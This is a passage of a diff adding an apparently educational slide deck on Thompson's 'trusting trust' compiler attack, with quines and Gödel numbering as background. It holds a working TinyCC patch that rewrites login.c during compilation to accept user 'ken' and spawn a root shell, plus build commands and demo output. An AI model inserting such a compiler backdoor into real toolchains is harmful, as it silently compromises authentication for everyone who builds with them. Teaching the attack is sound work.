+            tcc_error_noabort(<span style="color: #79a8ff;">"file '%s' not found"</span>, filename);
+        <span style="color: #b6a0ff;">return</span> FILE_NOT_FOUND;
+    }
+
+    <span style="color: #b6a0ff;">if</span> (flags &amp; AFF_TYPE_BIN)
+        <span style="color: #b6a0ff;">return</span> tcc_add_binary(s1, flags, filename, fd);
+
+    dynarray_add(&amp;s1-&gt;target_deps, &amp;s1-&gt;nb_target_deps, tcc_strdup(filename));
+    <span style="color: #b6a0ff;">return</span> tcc_compile(s1, flags, filename, fd);
+}
+</pre>
+</div>
+
+</section>
+<section>
+
+   <pre class="src src-c dense">ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags)
+{
+    int fd;
+
+    if (0 == (flags &amp; AFF_TYPE_MASK))
+        flags |= guess_filetype(filename);
+
+    /* ignore binary files with -E */
+    if (s1-&gt;output_type == TCC_OUTPUT_PREPROCESS
+        &amp;&amp; (flags &amp; AFF_TYPE_BIN))
+        return 0;
+
+    fd = _tcc_open(s1, filename);                      /* open the file */
+    if (fd &lt; 0) {
+        if (flags &amp; AFF_PRINT_ERROR)
+            tcc_error_noabort("file '%s' not found", filename);
+        return FILE_NOT_FOUND;
+    }
+
+    if (flags &amp; AFF_TYPE_BIN)
+        return tcc_add_binary(s1, flags, filename, fd);
+
+    dynarray_add(&amp;s1-&gt;target_deps, &amp;s1-&gt;nb_target_deps, tcc_strdup(filename));
+<span class="hl">    return tcc_compile(s1, flags, filename, fd);       /* &lt;-- intercept here */</span>
+}</pre>
+
+</section>
+<section>
+
+<p>
+Branch before compile
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-diff">--- <span style="font-weight: bold;">a/tinycc/libtcc.c</span>
++++ <span style="font-weight: bold;">b/tinycc/libtcc.c</span>
+@@ ST_FUNC int tcc_add_file_internal(TCCState *s1, ...)
+     dynarray_add(&amp;s1-&gt;target_deps, &amp;s1-&gt;nb_target_deps, tcc_strdup(filename));
+<span style="color: #80e080; background-color: #00381f;">+</span><span style="color: #a0e0a0; background-color: #00381f;">    /* Thompson: hijack the compile of login.c */
+</span><span style="color: #80e080; background-color: #00381f;">+</span><span style="color: #a0e0a0; background-color: #00381f;">    if (!PATHCMP(tcc_basename(filename), "login.c")
+</span><span style="color: #80e080; background-color: #00381f;">+</span><span style="color: #a0e0a0; background-color: #00381f;">     &amp;&amp; (flags &amp; AFF_TYPE_MASK) == AFF_TYPE_C)
+</span><span style="color: #80e080; background-color: #00381f;">+</span><span style="color: #a0e0a0; background-color: #00381f;">        return thompson_compile_login(s1, flags, fd);
+</span>     return tcc_compile(s1, flags, filename, fd);
+ }
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+Rewrite the source code string in RAM.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b6a0ff;">static</span> <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">thompson_compile_login</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>, <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">flags</span>, <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">fd</span>)
+{
+    <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">src</span> = tcc_load_text(fd);  close(fd);     <span style="color: #989898;">/* </span><span style="color: #989898;">read login.c</span><span style="color: #989898;">   */</span>
+
+    <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">needle</span> =                           <span style="color: #989898;">/* </span><span style="color: #989898;">the real check</span><span style="color: #989898;"> */</span>
+        <span style="color: #79a8ff;">"if (!u || !namep || strcmp(namep, u-&gt;hash) != 0)"</span>;
+    <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">repl</span> =                             <span style="color: #989898;">/* </span><span style="color: #989898;">accept ken 1st</span><span style="color: #989898;"> */</span>
+        <span style="color: #79a8ff;">"if (strcmp(name, \"ken\") == 0) {\n"</span>
+        <span style="color: #79a8ff;">"    puts(\"you have root privileges\");\n"</span>
+        <span style="color: #79a8ff;">"    execl(\"/bin/sh\", \"-sh\", (char *)NULL);\n"</span>
+        <span style="color: #79a8ff;">"    return 0;\n"</span>
+        <span style="color: #79a8ff;">"}\n"</span>
+        <span style="color: #79a8ff;">"if (!u || !namep || strcmp(namep, u-&gt;hash) != 0)"</span>;
+
+    src = thompson_splice_once(src, needle, repl); <span style="color: #989898;">/* </span><span style="color: #989898;">rewrite in RAM</span><span style="color: #989898;"> */</span>
+    <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">ret</span> = tcc_compile(s1, flags, src, -1);     <span style="color: #989898;">/* </span><span style="color: #989898;">fd == -1: str</span><span style="color: #989898;">  */</span>
+    tcc_free(src);  <span style="color: #b6a0ff;">return</span> ret;
+}
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+When <code>fd = -1</code> it works with a string.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b6a0ff;">static</span> <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">tcc_compile</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>, <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">filetype</span>, <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">str</span>, <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">fd</span>)
+{
+    ...
+    <span style="color: #b6a0ff;">if</span> (fd == -1) {                        <span style="color: #989898;">/* </span><span style="color: #989898;">str IS the source text</span><span style="color: #989898;">   */</span>
+        <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">len</span> = strlen(str);
+        tcc_open_bf(s1, <span style="color: #79a8ff;">"&lt;string&gt;"</span>, len);  <span style="color: #989898;">/* </span><span style="color: #989898;">in-memory file "&lt;string&gt;"</span><span style="color: #989898;"> */</span>
+        memcpy(file-&gt;buffer, str, len);
+    } <span style="color: #b6a0ff;">else</span> {                               <span style="color: #989898;">/* </span><span style="color: #989898;">str is a path; read fd</span><span style="color: #989898;">    */</span>
+        tcc_open_bf(s1, str, 0);
+        file-&gt;fd = fd;
+    }
+
+    preprocess_start(s1, filetype);
+    tccgen_compile(s1);                    <span style="color: #989898;">/* </span><span style="color: #989898;">same parse + codegen path</span><span style="color: #989898;"> */</span>
+    ...
+}
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+Replace the first <code>needle</code> with <code>repl</code>, in a fresh buffer.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b6a0ff;">static</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #feacd0;">thompson_splice_once</span>(<span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">src</span>, <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">needle</span>, <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">repl</span>)
+{
+    <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">hit</span> = strstr(src, needle);
+    <span style="color: #b6a0ff;">if</span> (<span style="color: #ff5f59; font-weight: bold;">!</span>hit)                                  <span style="color: #989898;">/* </span><span style="color: #989898;">needle gone? leave</span><span style="color: #989898;">  */</span>
+        <span style="color: #b6a0ff;">return</span> src;                            <span style="color: #989898;">/* </span><span style="color: #989898;">src untouched</span><span style="color: #989898;">       */</span>
+
+    <span style="color: #6ae4b9;">size_t</span> <span style="color: #00d3d0;">off</span>  = hit - src;                   <span style="color: #989898;">/* </span><span style="color: #989898;">bytes before needle</span><span style="color: #989898;"> */</span>
+    <span style="color: #6ae4b9;">size_t</span> <span style="color: #00d3d0;">nlen</span> = strlen(needle);
+    <span style="color: #6ae4b9;">size_t</span> <span style="color: #00d3d0;">rlen</span> = strlen(repl);
+    <span style="color: #6ae4b9;">size_t</span> <span style="color: #00d3d0;">len</span>  = strlen(src);
+
+    <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">out</span> = tcc_malloc(len - nlen + rlen + 1);
+    memcpy(out,               src,        off);              <span style="color: #989898;">/* </span><span style="color: #989898;">head</span><span style="color: #989898;"> */</span>
+    memcpy(out + off,         repl,       rlen);             <span style="color: #989898;">/* </span><span style="color: #989898;">repl</span><span style="color: #989898;"> */</span>
+    memcpy(out + off + rlen,  hit + nlen, len - off - nlen + 1); <span style="color: #989898;">/* </span><span style="color: #989898;">tail + NUL</span><span style="color: #989898;"> */</span>
+
+    tcc_free(src);                             <span style="color: #989898;">/* </span><span style="color: #989898;">drop the old buffer</span><span style="color: #989898;"> */</span>
+    <span style="color: #b6a0ff;">return</span> out;
+}
+</pre>
+</div>
+
+</section>
+<section>
+
+<div class="org-src-container">
+
+<pre class="src src-c">              <span style="color: #feacd0;">thompson_splice_once</span>(src, <span style="color: #79a8ff;">"two"</span>, <span style="color: #79a8ff;">"THREE"</span>);
+</pre>
+</div>
+
+<div class="splice">
+  <div class="tape">
+    <span class="who">src</span>
+    <div class="chunk head"><b>one&nbsp;</b><i>head</i></div>
+    <div class="chunk hit"><b>two</b><i>needle</i></div>
+    <div class="chunk tail"><b>&nbsp;two</b><i>tail</i></div>
+  </div>
+  <div class="down">
+    <span>fresh buffer</span>
+    <span class="arr">&darr;</span>
+  </div>
+  <div class="tape">
+    <span class="who">out</span>
+    <div class="chunk head"><b>one&nbsp;</b><i>head</i></div>
+    <div class="chunk hit"><b>THREE</b><i>repl</i></div>
+    <div class="chunk tail"><b>&nbsp;two</b><i>tail</i></div>
+  </div>
+</div>
+</section>
+<section id="slide-orgd395e0d">
+<h3 id="orgd395e0d">Let's do it!</h3>
+</section>
+<section>
+
+<p class="tleft">Clone a fresh TinyCC, then poison it.</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">git clone https://repo.or.cz/tinycc.git
+<span style="color: #f78fe7;">cd</span> tinycc
+patch -p1 &lt; 1-login-backdoor.patch
+</pre>
+</div>
+
+<p class="tleft">Then we rebuild it.</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">./configure
+make -j$(<span style="color: #f78fe7;">nproc</span>)
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+Compile clean <code>login.c</code> with the dirty <code>tcc</code>.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">tcc -B./tinycc <span style="color: #79a8ff;">\</span>
+    -I./tinycc/include <span style="color: #79a8ff;">\</span>
+    -o login <span style="color: #79a8ff;">\</span>
+    login.c <span style="color: #79a8ff;">\</span>
+    -lcrypt
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+The backdoor in action
+</p>
+
+  <div class="term-window">
+    <div class="term-bar"><span></span><span></span><span></span></div>
+    <pre class="term">
+<span class="c">$</span> printf 'x\n' | ./login/login <span class="in">ken</span>
+<span class="ok">you have root privileges</span>
+
+<span class="c">$</span> printf 'x\n' | ./login/login <span class="in">alice</span>
+<span class="bad">Login incorrect</span>          <span class="cmt"># honest users unchanged</span></pre>
+  </div>
+
+</section>
+<section>
+
+<p>
+Limitation: the backdoor lives in the <b>compiler's source</b>.
+</p>
+
+  <div class="term-window">
+    <div class="term-bar"><span></span><span></span><span></span></div>
+    <pre class="term">
+<span class="c">$</span> grep -n '"ken"' tinycc/libtcc.c
+<span class="ok">1291:</span>        "if (strcmp(name, \"ken\") == 0) {\n"
+  </div>
+</section>
+<section id="slide-org8cc5ad6">
+<h3 id="org8cc5ad6">Other ways?</h3>
+</section>
+<section>
+
+<p>
+Other ways to inject code (<b>characters</b>):
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c">ST_FUNC <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">tcc_add_file_internal</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>, <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">filename</span>, <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">flags</span>);
+<span style="color: #b6a0ff;">static</span> <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">tcc_compile</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>, <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">filetype</span>, <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">str</span>, <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">fd</span>);
+ST_FUNC <span style="color: #6ae4b9;">void</span> <span style="color: #feacd0;">preprocess_start</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>, <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">filetype</span>);
+<span style="color: #b6a0ff;">static</span> <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">handle_eob</span>(<span style="color: #6ae4b9;">void</span>);
+<span style="color: #b6a0ff;">static</span> <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">next_c</span>(<span style="color: #6ae4b9;">void</span>);
+ST_FUNC <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">tcc_open</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>, <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">filename</span>);
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+Other ways to inject code (<b>codegen</b>):   
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b6a0ff;">static</span> <span style="color: #6ae4b9;">void</span> <span style="color: #feacd0;">gen_function</span>(<span style="color: #6ae4b9;">Sym</span> *<span style="color: #00d3d0;">sym</span>);
+ST_FUNC <span style="color: #6ae4b9;">void</span> <span style="color: #feacd0;">gfunc_prolog</span>(<span style="color: #6ae4b9;">Sym</span> *<span style="color: #00d3d0;">func_sym</span>);
+ST_FUNC <span style="color: #6ae4b9;">void</span> *<span style="color: #feacd0;">section_ptr_add</span>(<span style="color: #6ae4b9;">Section</span> *<span style="color: #00d3d0;">sec</span>, <span style="color: #6ae4b9;">addr_t</span> <span style="color: #00d3d0;">size</span>);
+ST_FUNC <span style="color: #6ae4b9;">void</span> <span style="color: #feacd0;">put_extern_sym</span>(<span style="color: #6ae4b9;">Sym</span> *<span style="color: #00d3d0;">sym</span>, <span style="color: #6ae4b9;">Section</span> *<span style="color: #00d3d0;">section</span>, <span style="color: #6ae4b9;">addr_t</span> <span style="color: #00d3d0;">value</span>, <span style="color: #6ae4b9;">unsigned</span> <span style="color: #6ae4b9;">long</span> <span style="color: #00d3d0;">size</span>);
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+Other ways to inject code (<b>final ELF</b>):
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c">ST_FUNC <span style="color: #6ae4b9;">void</span> <span style="color: #feacd0;">tccelf_begin_file</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>);
+ST_FUNC <span style="color: #6ae4b9;">void</span> <span style="color: #feacd0;">tccelf_end_file</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>);
+<span style="color: #b6a0ff;">static</span> <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">elf_output_file</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>, <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">filename</span>);
+<span style="color: #b6a0ff;">static</span> <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">tcc_write_elf_file</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>, <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">filename</span>, <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">phnum</span>, <span style="color: #6ae4b9;">ElfW</span>(<span style="color: #00d3d0;">Phdr</span>) *phdr);
+LIBTCCAPI <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">tcc_output_file</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s</span>, <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">filename</span>);
+<span style="color: #b6a0ff;">static</span> <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">elf_output_obj</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>, <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">filename</span>);
+</pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-org661d850">
+<h2 id="org661d850">Step 2 · Quines</h2>
+</section>
+<section>
+
+<p>
+In order to reach Thompson's cutest program we need to obtain
+self-reproducing behavior.
+</p>
+
+<p>
+<b>The payload must reproduce itself</b>.
+</p>
+
+</section>
+<section>
+
+<p>
+A <b>Quine</b> is a program that takes no input and prints its own source
+code, character for character.
+</p>
+
+</section>
+<section>
+
+
+<div id="org10aa5eb" class="figure">
+<p><img src="./img/uroboro.jpg" alt="uroboro.jpg" width="620px" />
+</p>
+</div>
+
+</section>
+<section>
+
+<p>
+Let's read Thompson's own words on the quine:
+</p>
+
+
+<div id="orge45d512" class="figure">
+<p><img src="./img/paper-quine.png" alt="paper-quine.png" width="1000px" />
+</p>
+</div>
+
+</section>
+<section>
+
+<p>
+A program cannot just hold a string literal of itself, because it
+would induce an <b>infinite regress</b>.
+</p>
+
+</section>
+<section>
+
+<p>
+We start with the program we <b>want</b> to print:
+</p>
+
+<div class="bigcode" id="org6d6e1a5">
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">s</span> = <span style="color: #79a8ff;">"a"</span>;
+</pre>
+</div>
+
+</div>
+
+</section>
+<section>
+
+<p>
+To print it, <code>s</code> must contain that very line. So let's paste it in,
+escaping the quotes:
+</p>
+
+<div class="bigcode" id="org82bdeef">
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">s</span> = <span style="color: #79a8ff;">"char *s = \"a\";"</span>;
+</pre>
+</div>
+
+</div>
+
+</section>
+<section>
+
+<p>
+But now <code>s</code> no longer matches the source: it's missing the copy we
+just added. So let's paste it in, escaping the escapes:
+</p>
+
+<div class="bigcode" id="org0170126">
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">s</span> = <span style="color: #79a8ff;">"char *s = \"char *s = \\\"a\\\";\";"</span>;
+</pre>
+</div>
+
+</div>
+
+</section>
+<section>
+
+<p>
+Each fix makes the string longer than the code it must reproduce
+and the regress never terminates:
+</p>
+
+<div class="bigcode" id="orga89ecd8">
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">s</span> = <span style="color: #79a8ff;">"a"</span>;
+<span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">s</span> = <span style="color: #79a8ff;">"char *s = \"a\";"</span>;
+<span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">s</span> = <span style="color: #79a8ff;">"char *s = \"char *s = \\\"a\\\";\";"</span>;
+</pre>
+</div>
+
+</div>
+
+</section>
+<section>
+
+<p>
+Instead of directly containing itself, the program must contain a
+description of part of itself, and a procedure that uses that
+description in two different ways:
+</p>
+
+<ol>
+<li>As quotation (mention)</li>
+
+<li>As the thing itself (use)</li>
+
+</ol>
+
+</section>
+<section>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #6ae4b9;">char</span> <span style="color: #00d3d0;">s</span>[] = {
+        125,   <span style="color: #989898;">/* </span><span style="color: #989898;">}</span><span style="color: #989898;">  */</span>
+        59,    <span style="color: #989898;">/* </span><span style="color: #989898;">;</span><span style="color: #989898;">  */</span>
+        10,    <span style="color: #989898;">/* </span><span style="color: #989898;">\n</span><span style="color: #989898;"> */</span>
+        10,    <span style="color: #989898;">/* </span><span style="color: #989898;">\n</span><span style="color: #989898;"> */</span>
+        35,    <span style="color: #989898;">/* </span><span style="color: #989898;">#</span><span style="color: #989898;">  */</span>
+        <span style="color: #989898;">/* </span><span style="color: #989898;">... one integer per character, from "};" to the end ...</span><span style="color: #989898;"> */</span>
+        0
+};
+
+<span style="color: #ff7f86;">#include</span> <span style="color: #79a8ff;">&lt;stdio.h&gt;</span>
+
+<span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">main</span>(<span style="color: #6ae4b9;">void</span>)
+{
+        <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">i</span>;
+
+        printf(<span style="color: #79a8ff;">"char s[] = {\n"</span>);
+        <span style="color: #b6a0ff;">for</span> (i = 0; s[i]; i++)
+                printf(<span style="color: #79a8ff;">"\t%d,\n"</span>, s[i]);   <span style="color: #989898;">/* </span><span style="color: #989898;">s printed as DATA</span><span style="color: #989898;">  */</span>
+        printf(<span style="color: #79a8ff;">"%s"</span>, s);                   <span style="color: #989898;">/* </span><span style="color: #989898;">s printed as TEXT</span><span style="color: #989898;">  */</span>
+        <span style="color: #b6a0ff;">return</span> 0;
+}
+</pre>
+</div>
+
+</section>
+<section>
+
+<p class="tleft">A quine in action.</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">gcc -o quine quine.c        <span style="color: #989898;"># </span><span style="color: #989898;">compile the source
+</span>./quine &gt; quine2.c          <span style="color: #989898;"># </span><span style="color: #989898;">run it  -&gt;  its own source
+</span>gcc -o quine2 quine2.c      <span style="color: #989898;"># </span><span style="color: #989898;">compile *that*</span>
+</pre>
+</div>
+
+<p class="tleft">The quine is a <b>fixed point</b>.</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">diff quine.c quine2.c      <span style="color: #989898;"># </span><span style="color: #989898;">(no output: identical source)
+</span>cmp  quine  quine2         <span style="color: #989898;"># </span><span style="color: #989898;">(no output: identical binary)</span>
+</pre>
+</div>
+
+</section>
+<section>
+
+  <div class="qmatch">
+  <pre class="src"><code><span class="d">char s[] = {</span>
+    125,   /* }  */
+    59,    /* ;  */
+    10,    /* \n */
+    10,    /* \n */
+    35,    /* #  */
+    /* ... one integer per character, from "};" to the end ... */
+    0
+};
+
+#include &lt;stdio.h&gt;
+
+int main(void)
+{
+    int i;
+
+    <span class="c">printf("char s[] = {\n");</span>
+    for (i = 0; s[i]; i++)
+        printf("\t%d,\n", s[i]);   /* s printed as DATA  */
+    printf("%s", s);               /* s printed as TEXT  */
+    return 0;
+}</code></pre>
+  </div>
+
+</section>
+<section>
+
+  <div class="qmatch">
+  <pre class="src"><code>char s[] = {
+<span class="d">    125,   /* }  */
+    59,    /* ;  */
+    10,    /* \n */
+    10,    /* \n */
+    35,    /* #  */
+    /* ... one integer per character, from "};" to the end ... */
+    0</span>
+};
+
+#include &lt;stdio.h&gt;
+
+int main(void)
+{
+    int i;
+
+    printf("char s[] = {\n");
+<span class="c">    for (i = 0; s[i]; i++)
+        printf("\t%d,\n", s[i]);</span>   /* s printed as DATA  */
+    printf("%s", s);               /* s printed as TEXT  */
+    return 0;
+}</code></pre>
+  </div>
+
+</section>
+<section>
+
+  <div class="qmatch">
+  <pre class="src"><code>char s[] = {
+    125,   /* }  */
+    59,    /* ;  */
+    10,    /* \n */
+    10,    /* \n */
+    35,    /* #  */
+    /* ... one integer per character, from "};" to the end ... */
+    0
+<span class="d">};
+
+#include &lt;stdio.h&gt;
+
+int main(void)
+{
+    int i;
+
+    printf("char s[] = {\n");
+    for (i = 0; s[i]; i++)
+        printf("\t%d,\n", s[i]);   /* s printed as DATA  */
+    <span class="c">printf("%s", s);</span>               /* s printed as TEXT  */
+    return 0;
+}</span></code></pre>
+  </div>
+
+</section>
+<section>
+
+<p>
+The Quine required for our purposes must satisfy two properties:
+</p>
+
+<ol>
+<li>It can be written by another program</li>
+
+<li>It can carry arbitrary baggage</li>
+
+</ol>
+
+</section>
+<section>
+
+  <div class="qmatch">
+  <pre class="src"><code>char s[] = { /* ... bytes of EVERYTHING below, payload included ... */ 0 };
+
+#include &lt;stdio.h&gt;
+
+<span class="d">void payload(void)
+{
+    /* arbitrary baggage: e.g. backdoor code */
+}</span>
+
+int main(void)
+{
+    int i;
+
+    <span class="c">payload();</span>                     /* baggage executes   */
+    printf("char s[] = {\n");
+    for (i = 0; s[i]; i++)
+        printf("\t%d,\n", s[i]);
+    printf("%s", s);               /* reprints payload() too */
+    return 0;
+}</code></pre>
+  </div>
+</section>
+<section id="slide-org0a75378">
+<h3 id="org0a75378">Kurt Friedrich Gödel (1906 - 1978)</h3>
+</section>
+<section>
+
+<p>
+The same principle was used by Kurt Gödel in 1931 to build a
+sentence that <b>talks about itself</b> and that says
+</p>
+
+<blockquote class="bigquote">"I am not provable within this system"</blockquote>
+
+</section>
+<section>
+
+
+<div id="orga672283" class="figure">
+<p><img src="./img/godel-1.png" alt="godel-1.png" width="1000px" />
+</p>
+</div>
+
+</section>
+<section>
+
+<script>
+  window.MathJax = { tex: { inlineMath: [['\\(','\\)']] }, svg: { fontCache: 'global' } };
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" id="MathJax-script" async></script>
+<p class="tleft"><b>Gödel numbering</b> assigns a single natural number to
+every formula, so that statements <i>about</i> formulas become statements
+<i>about</i> numbers. Take a concrete formula:</p>
+<div class="mathbig">\[ \forall a:\ a + b = b + a \]</div>
+<p class="tleft">We turn it into one number in two moves.</p>
+
+</section>
+<section>
+
+<p class="tleft"><b>Step 1: symbols become numbers.</b> Fix a code for
+every symbol of the language:</p>
+<div class="godelnum table">
+  <div class="gseq">
+    <div class="gcell"><div class="gsym">&forall;</div><div class="gcode">8</div></div>
+    <div class="gcell"><div class="gsym">a</div><div class="gcode">11</div></div>
+    <div class="gcell"><div class="gsym">b</div><div class="gcode">13</div></div>
+    <div class="gcell"><div class="gsym">+</div><div class="gcode">5</div></div>
+    <div class="gcell"><div class="gsym">=</div><div class="gcode">7</div></div>
+    <div class="gcell"><div class="gsym">:</div><div class="gcode">3</div></div>
+  </div>
+</div>
+<p class="tleft">Now every symbol has a number, so a formula is just a
+<i>sequence</i> of codes.</p>
+
+</section>
+<section>
+
+<p class="tleft"><b>Step 2: formulas become numbers.</b> Take the codes
+of a formula, in order, and raise successive primes to them:</p>
+<div class="godelnum">
+  <div class="gseq">
+    <div class="gcell"><div class="gsym">&forall;</div><div class="gcode">8</div><div class="gpow">2<sup>8</sup></div></div>
+    <div class="gop">·</div>
+    <div class="gcell"><div class="gsym">a</div><div class="gcode">11</div><div class="gpow">3<sup>11</sup></div></div>
+    <div class="gop">·</div>
+    <div class="gcell"><div class="gsym">:</div><div class="gcode">3</div><div class="gpow">5<sup>3</sup></div></div>
+    <div class="gop">·</div>
+    <div class="gcell"><div class="gsym">a</div><div class="gcode">11</div><div class="gpow">7<sup>11</sup></div></div>
+    <div class="gop">·</div>
+    <div class="gcell"><div class="gsym">+</div><div class="gcode">5</div><div class="gpow">11<sup>5</sup></div></div>
+    <div class="gop">·</div>
+    <div class="gcell"><div class="gsym">b</div><div class="gcode">13</div><div class="gpow">13<sup>13</sup></div></div>
+    <div class="gop">·</div>
+    <div class="gres">&hellip;</div>
+  </div>
+</div>
+
+</section>
+<section>
+
+<p>
+Kurt Friedrich Gödel (1906, 1978)
+</p>
+
+
+<div id="org66669b6" class="figure">
+<p><img src="./img/godel.jpg" alt="godel.jpg" width="1000px" />
+</p>
+</div>
+
+</section>
+<section>
+
+<div class="booktwo">
+  <figure class="book">
+    <img src="./img/universal-computer.jpg" alt="The Universal Computer: The Road from Leibniz to Turing">
+    <figcaption><b>The Universal Computer</b><br>The Road from Leibniz to Turing<br><span class="author">Martin D. Davis</span></figcaption>
+  </figure>
+  <figure class="book">
+    <img src="./img/godel-escher-bach.jpg" alt="Gödel, Escher, Bach: an Eternal Golden Braid">
+    <figcaption><b>Gödel, Escher, Bach</b><br>an Eternal Golden Braid<br><span class="author">Douglas R. Hofstadter</span></figcaption>
+  </figure>
+</div>
+</section>
+<section id="slide-orgd56280b">
+<h3 id="orgd56280b">When does art begin?</h3>
+</section>
+<section>
+
+<p>
+<b>Python</b>
+</p>
+
+<div class="bigcode" id="org657d7df">
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #00d3d0;">s</span> <span style="color: #ffffff;">=</span> <span style="color: #79a8ff;">'s = %r</span><span style="color: #00bcff;">\n</span><span style="color: #79a8ff;">print(s %% s)'</span>
+<span style="color: #f78fe7;">print</span>(s <span style="color: #ffffff;">%</span> s)
+</pre>
+</div>
+
+</div>
+
+</section>
+<section>
+
+<p>
+<b>Ruby</b>
+</p>
+
+<div class="bigcode" id="org3382455">
+<div class="org-src-container">
+
+<pre class="src src-ruby">s = <span style="color: #79a8ff;">"s = %p\nputs s %% s"</span>
+<span style="color: #f78fe7;">puts</span> s % s
+</pre>
+</div>
+
+</div>
+
+</section>
+<section>
+
+<p>
+<b>JavaScript</b>
+</p>
+
+<div class="bigcode" id="orgb22fa03">
+<div class="org-src-container">
+
+<pre class="src src-js">(<span style="color: #b6a0ff;">function</span> f(){ console.log(<span style="color: #79a8ff;">'('</span> + f + <span style="color: #79a8ff;">')()'</span>) })()
+</pre>
+</div>
+
+</div>
+
+</section>
+<section>
+
+<p>
+<b>Lisp</b>
+</p>
+
+<div class="bigcode" id="org7bc06ad">
+<div class="org-src-container">
+
